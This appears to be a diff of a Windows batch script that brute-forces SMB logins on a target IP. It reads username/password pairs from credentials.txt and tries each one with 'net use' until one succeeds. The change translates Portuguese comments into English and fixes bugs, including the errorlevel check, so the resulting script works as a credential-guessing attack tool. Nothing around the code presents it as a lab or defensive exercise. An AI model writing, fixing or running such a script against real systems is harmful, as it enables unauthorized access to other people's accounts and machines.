@@ -1,18 +1,20 @@
-::para desativar toda a exibição do terminal
 @echo off
+setlocal enabledelayedexpansion
 
-::defina aqui o IP alvo
-set "ip_alvo=<ip_alvo>"
+:: Set the target IP here
+set "target_ip=<target_ip>"
 
-for /f "tokens=1,2" %%i in (senhas.txt) do(
-    echo Testando senha: %%i / %%j...
-    net use \\%ip_alvo% %%j /user:%%i > null 2>&1
-    if %errorlevel%==0 (
-        echo [SUCESSO] credenciais validas: %%i / %%j
+for /f "tokens=1,2" %%i in (credentials.txt) do (
+    echo Testing username: %%i / password: %%j...
+    net use \\%target_ip% %%j /user:%%i >nul 2>&1
+
+    if !errorlevel! equ 0 (
+        echo [SUCCESS] Valid credentials found: %%i / %%j
         exit /b 0
     ) else (
-        echo [FALHA] credenciais invalidas: %%i / %%j
+        echo [FAILED] Invalid credentials: %%i / %%j
     )
 )
-echo todas as combinações falharam
+
+echo All combinations failed
 exit /b 1
